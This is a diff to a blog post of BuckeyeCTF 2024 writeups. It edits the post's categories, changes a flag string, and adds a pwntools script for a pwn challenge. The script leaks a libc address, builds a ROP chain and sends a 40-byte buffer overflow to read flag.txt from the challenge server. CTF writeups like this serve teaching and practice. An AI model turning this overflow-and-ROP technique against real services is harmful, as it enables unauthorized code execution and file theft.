@@ -2,7 +2,7 @@
 layout: post
 title: BuckeyeCTF 2024 Writeups
 date: 2024-09-30 04:04:06 -0400
-categories: jekyll update
+categories: ctf writeup
 ---
 
 {{ page.title }}
@@ -223,7 +223,7 @@ r.interactive()
 
 Executing this script will give us the flag!
 
-`bctf{P33r_1nT0_tH3_j4r_2_f1nd_Th3_S3cR3Ts_d1463580a690f294}`
+`bctf{P33r_1nT0_tH3_j4r_2_f1nd_Th3_S3cR3Ts_df1249643580a690}`
 
 # rev/thank
 
@@ -244,3 +244,26 @@ This time, we have a [zipfile]({{ site.baseurl }}/assets/ctf/buckeyeCTF-2024/pwn
 First off, let's take a look at the binary. Running `checksec` on it, we see that it's a 64-bit binary with NX, PIE, and RELRO enabled. 
 
 
+```python
+from pwn import *
+
+context.binary = ELF('chall')
+
+libc = ELF("libc.so.6")
+io = remote('challs.pwnoh.io', 13371)
+
+io.recvuntil(b"it's at ")
+system_addr = int(io.recvline().strip(), 16)
+libc.address = system_addr - libc.symbols["system"]
+
+rop = ROP(libc)
+flag_buff = libc.bss()
+
+rop.gets(flag_buff)
+rop.open(flag_buff, 0)
+rop.sendfile(1, 3, 0, 50)
+
+io.sendline(b'a' * 40 + rop.chain())
+io.sendlineafter(b"else", b"flag.txt")
+io.interactive()
+```
